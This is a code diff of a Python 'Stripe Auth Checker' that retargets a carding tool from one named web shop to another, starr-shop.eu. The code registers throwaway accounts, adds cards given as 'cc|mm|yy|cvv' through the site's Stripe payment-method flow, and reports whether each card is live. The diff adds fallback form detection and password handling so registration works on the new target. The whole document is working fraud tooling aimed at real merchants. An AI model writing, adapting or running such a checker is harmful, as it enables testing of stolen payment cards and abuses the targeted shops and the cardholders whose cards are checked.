@@ -1,7 +1,7 @@
 """
-Fast Grownetics Stripe Auth Checker
+Fast Starr Shop Stripe Auth Checker
 ====================================
-High-speed implementation for grownetics.com
+High-speed implementation for starr-shop.eu
 Workflow: Register -> Dashboard -> Payment Methods -> Add Payment Method -> Stripe API -> Confirm
 """
 
@@ -14,8 +14,8 @@ import json
 from typing import Dict, Optional
 from bs4 import BeautifulSoup
 
-# Grownetics site
-GROWNETICS_SITE = "https://grownetics.com"
+# Starr Shop site
+STARR_SITE = "https://starr-shop.eu"
 
 # Fast timeout for high-speed operation (optimized for speed - silver bullet)
 REQUEST_TIMEOUT = 35  # Reduced for maximum speed
@@ -35,13 +35,13 @@ def generate_random_password() -> str:
     return ''.join(random.choices(chars, k=14))
 
 
-class GrowneticsStripeChecker:
+class StarrStripeChecker:
     """
-    Fast Grownetics Stripe Checker with optimized workflow.
+    Fast Starr Shop Stripe Checker with optimized workflow.
     """
     
     def __init__(self):
-        self.site_url = GROWNETICS_SITE.rstrip('/')
+        self.site_url = STARR_SITE.rstrip('/')
         self.stripe_pk = None
         self.nonce = None
         self.email = None
@@ -108,6 +108,11 @@ class GrowneticsStripeChecker:
                 reg_form = soup.find('form', {'class': 'woocommerce-form-register'})
                 if not reg_form:
                     reg_form = soup.find('form', {'class': 'register'})
+                if not reg_form:
+                    # Try to find any form with email field
+                    reg_form = soup.find('form')
+                    if reg_form and not soup.find('input', {'name': 'email', 'type': 'email'}):
+                        reg_form = None
                 
                 if not reg_form:
                     result["response"] = "SITE_ERROR"
@@ -122,11 +127,19 @@ class GrowneticsStripeChecker:
                     if name:
                         form_data[name] = value
                 
-                # Add registration data (email-only registration for grownetics)
-                form_data.update({
-                    'email': self.email,
-                    'register': 'Register',
-                })
+                # Add registration data (check if email-only or email+password)
+                has_password = soup.find('input', {'name': 'password', 'type': 'password'})
+                if has_password:
+                    form_data.update({
+                        'email': self.email,
+                        'password': self.password,
+                        'register': 'Register',
+                    })
+                else:
+                    form_data.update({
+                        'email': self.email,
+                        'register': 'Register',
+                    })
                 
                 # Step 2: Submit registration (FAST - no delays)
                 reg_headers = self._get_headers(
@@ -151,9 +164,6 @@ class GrowneticsStripeChecker:
                 ) as resp:
                     html2 = await resp.text()
                     self.session_cookies.update(resp.cookies)
-                    
-                    # Check if we're logged in (passwordless registration may require different flow)
-                    # If registration was successful, we should be able to access payment methods
                 
                 # Step 4: Get payment-methods/ page (FAST - required step)
                 async with session.get(
@@ -408,9 +418,9 @@ class GrowneticsStripeChecker:
             return result
 
 
-async def check_grownetics_stripe(fullcc: str) -> Dict:
+async def check_starr_stripe(fullcc: str) -> Dict:
     """
-    Fast check a card using Grownetics Stripe Auth.
+    Fast check a card using Starr Shop Stripe Auth.
     
     Args:
         fullcc: Card in format cc|mm|yy|cvv or cc|mm|yyyy|cvv
@@ -425,7 +435,7 @@ async def check_grownetics_stripe(fullcc: str) -> Dict:
             "response": "INVALID_FORMAT",
             "message": "Card must be in format: cc|mm|yy|cvv",
             "card": fullcc,
-            "site": GROWNETICS_SITE,
+            "site": STARR_SITE,
         }
     
     card, month, year, cvv = parts
@@ -438,11 +448,11 @@ async def check_grownetics_stripe(fullcc: str) -> Dict:
     if len(year) == 2:
         year = "20" + year
     
-    checker = GrowneticsStripeChecker()
+    checker = StarrStripeChecker()
     return await checker.check_card(card, month, year, cvv)
 
 
-def determine_grownetics_status(result: Dict) -> str:
+def determine_starr_status(result: Dict) -> str:
     """
     Determine the display status from result.
     
